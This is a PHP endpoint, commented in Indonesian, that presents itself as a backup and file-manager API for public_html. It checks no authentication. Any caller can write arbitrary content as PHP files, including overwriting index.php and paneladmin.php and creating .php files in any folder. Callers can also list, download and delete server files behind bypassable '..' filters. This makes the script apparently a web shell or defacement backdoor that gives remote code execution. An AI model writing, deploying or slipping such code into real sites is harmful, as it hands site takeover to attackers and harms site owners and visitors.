<?php
header('Content-Type: application/json');

// Menentukan direktori dasar (public_html)
$base_dir = __DIR__;
$backup_dir = $base_dir . '/testrxbackup';

// Buat folder backup jika belum ada
if (!file_exists($backup_dir)) {
    mkdir($backup_dir, 0777, true);
}

// Ambil aksi dari request
$action = $_POST['action'] ?? $_GET['action'] ?? '';

switch ($action) {
    case 'upload_debug':
        $type = $_POST['type'] ?? 'index';
        $content = $_POST['content'] ?? '';
        
        $filename = ($type === 'panel') ? 'debug2.php' : 'debug.php';
        $filepath = $base_dir . '/' . $filename;
        
        if (file_put_contents($filepath, $content) !== false) {
            echo json_encode(['status' => 'success', 'msg' => "File $filename berhasil disimpan ke server."]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => "Gagal menyimpan $filename. Periksa izin folder (CHMOD)."]);
        }
        break;

    // --- FITUR BARU: UPLOAD PUBLIC HTML (Index & Panel) ---
    case 'upload_public':
        $type = $_POST['type'] ?? 'index'; 
        $ext = $_POST['ext'] ?? '.php';
        $content = $_POST['content'] ?? '';
        
        // Pastikan hanya index dan paneladmin yang bisa diupload melalui tombol ini
        if (!in_array($type, ['index', 'paneladmin'])) {
            echo json_encode(['status' => 'error', 'msg' => 'Tipe file tidak diizinkan.']);
            exit;
        }
        
        $filename = $type . $ext;
        $filepath = $base_dir . '/' . $filename;
        
        if (file_put_contents($filepath, $content) !== false) {
            echo json_encode(['status' => 'success', 'msg' => "File '$filename' berhasil ditimpa di public_html!"]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => "Gagal menyimpan '$filename'. Periksa izin folder."]);
        }
        break;

    case 'backup':
        $filename = $_POST['filename'] ?? 'backup_baru';
        $ext = $_POST['ext'] ?? '.html';
        $content = $_POST['content'] ?? '';
        
        $filename = preg_replace('/[^a-zA-Z0-9_-]/', '_', $filename);
        $fullpath = $backup_dir . '/' . $filename . $ext;
        
        if (file_put_contents($fullpath, $content) !== false) {
            echo json_encode(['status' => 'success', 'msg' => "Backup '$filename$ext' berhasil disimpan!"]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'Gagal menyimpan backup.']);
        }
        break;

    case 'list_backups':
        $files = [];
        foreach (glob($backup_dir . '/*.*') as $file) {
            $files[] = [
                'name' => basename($file),
                'time' => filemtime($file),
                'date' => date('Y-m-d H:i:s', filemtime($file))
            ];
        }
        usort($files, function($a, $b) {
            return $b['time'] - $a['time'];
        });
        
        echo json_encode(['status' => 'success', 'data' => $files]);
        break;

    case 'get_backup':
        $filename = $_POST['filename'] ?? '';
        $filename = basename($filename);
        $filepath = $backup_dir . '/' . $filename;
        
        if (file_exists($filepath)) {
            $content = file_get_contents($filepath);
            echo json_encode(['status' => 'success', 'content' => $content]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'File backup tidak ditemukan.']);
        }
        break;

    case 'delete_backup':
        $filename = $_POST['filename'] ?? '';
        $filename = str_replace('..', '', $filename); // Mendukung baca path dari dalam folder
        $filepath = $backup_dir . '/' . $filename;
        
        if (file_exists($filepath)) {
            if (unlink($filepath)) {
                echo json_encode(['status' => 'success', 'msg' => "File '$filename' berhasil dihapus."]);
            } else {
                echo json_encode(['status' => 'error', 'msg' => "Gagal menghapus '$filename'. Periksa izin file."]);
            }
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'File backup tidak ditemukan.']);
        }
        break;

    case 'list_server_files':
        $path = $_GET['path'] ?? '';
        $path = str_replace('..', '', $path); // Cegah directory traversal
        $target_dir = rtrim($base_dir . '/' . $path, '/');
        $items = [];
        $allowed_ext = ['php', 'html', 'js', 'txt', 'css'];
        if (is_dir($target_dir)) {
            foreach (scandir($target_dir) as $file) {
                if ($file !== '.' && $file !== '..') {
                    $filepath = $target_dir . '/' . $file;
                    $rel_path = ltrim($path . '/' . $file, '/');
                    if (is_dir($filepath)) {
                        $items[] = ['type' => 'dir', 'name' => $file, 'path' => $rel_path];
                    } else {
                        $ext = pathinfo($file, PATHINFO_EXTENSION);
                        if (in_array(strtolower($ext), $allowed_ext)) {
                            $items[] = ['type' => 'file', 'name' => $file, 'path' => $rel_path, 'size' => round(filesize($filepath) / 1024, 2)];
                        }
                    }
                }
            }
        }
        echo json_encode(['status' => 'success', 'data' => $items]);
        break;
    /*
        $files = [];
        $allowed_ext = ['php', 'html', 'js', 'txt', 'css'];
        $all_files = scandir($base_dir);
        foreach ($all_files as $file) {
            if ($file !== '.' && $file !== '..') {
                $filepath = $base_dir . '/' . $file;
                if (is_file($filepath)) {
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    if (in_array(strtolower($ext), $allowed_ext)) {
                        $files[] = [
                            'name' => $file,
                            'size' => round(filesize($filepath) / 1024, 2)
                        ];
                    }
                }
            }
        }
        echo json_encode(['status' => 'success', 'data' => $files]);
        break;

    */
    case 'get_server_file':
        $filename = $_POST['filename'] ?? '';
        $filename = basename($filename); 
        $filepath = $base_dir . '/' . $filename;
        
        if (file_exists($filepath) && is_file($filepath)) {
            $content = file_get_contents($filepath);
            echo json_encode(['status' => 'success', 'content' => $content]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => 'File tidak ditemukan di server.']);
        }
        break;

    case 'download_server_file':
        $filename = $_GET['file'] ?? '';
        $filename = str_replace('..', '', $filename);
        $filepath = rtrim($base_dir . '/' . $filename, '/');
        if (file_exists($filepath) && is_file($filepath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        }
        echo "File tidak ditemukan.";
        exit;

    case 'upload_custom':
        $path = $_POST['path'] ?? '';
        $path = str_replace('..', '', $path);
        $filename = $_POST['filename'] ?? 'file_baru';
        $filename = preg_replace('/[^a-zA-Z0-9_-]/', '_', $filename);
        $ext = $_POST['ext'] ?? '.php';
        $content = $_POST['content'] ?? '';
        
        if (!in_array(strtolower($ext), ['.php', '.html'])) {
            echo json_encode(['status' => 'error', 'msg' => 'Ekstensi file tidak diizinkan.']);
            exit;
        }

        $target_dir = rtrim($base_dir . '/' . $path, '/');
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0777, true);
        }
        
        $filepath = $target_dir . '/' . $filename . $ext;
        if (file_put_contents($filepath, $content) !== false) {
            echo json_encode(['status' => 'success', 'msg' => "File '$filename$ext' berhasil diupload & ditimpa!"]);
        } else {
            echo json_encode(['status' => 'error', 'msg' => "Gagal mengupload file. Periksa izin direktori."]);
        }
        break;

    default:
        echo json_encode(['status' => 'error', 'msg' => 'Aksi API tidak valid.']);
}